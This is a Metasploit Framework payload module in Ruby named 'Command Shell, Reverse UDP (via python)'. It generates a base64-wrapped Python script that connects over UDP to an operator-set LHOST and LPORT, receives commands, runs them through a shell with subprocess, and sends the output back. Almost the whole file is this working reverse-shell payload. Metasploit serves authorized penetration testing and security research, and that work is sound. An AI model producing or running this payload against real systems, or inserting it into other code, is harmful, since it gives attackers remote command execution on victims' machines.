##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = 453

  include Msf::Payload::Single
  include Msf::Payload::Python
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Command Shell, Reverse UDP (via python)',
      'Description'   => 'Creates an interactive shell via Python, encodes with base64 by design. Compatible with Python 2.6-2.7 and 3.4+.',
      'Author'        => 'RageLtMan <rageltman[at]sempervictus>',
      'License'       => MSF_LICENSE,
      'Platform'      => 'python',
      'Arch'          => ARCH_PYTHON,
      'Handler'       => Msf::Handler::ReverseUdp,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'python',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Constructs the payload
  #
  def generate
    super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    cmd = <<~PYTHON
      import socket as s
      import subprocess as r
      so=s.socket(s.AF_INET,s.SOCK_DGRAM)
      o=b''
      while True:
      	so.sendto(o,('#{datastore['LHOST']}',#{datastore['LPORT']}))
      	d=so.recv(1024)
      	if len(d)==0:
      		break
      	p=r.Popen(d,shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)
      	o=p.stdout.read()+p.stderr.read()
    PYTHON

    py_create_exec_stub(cmd)
  end

end

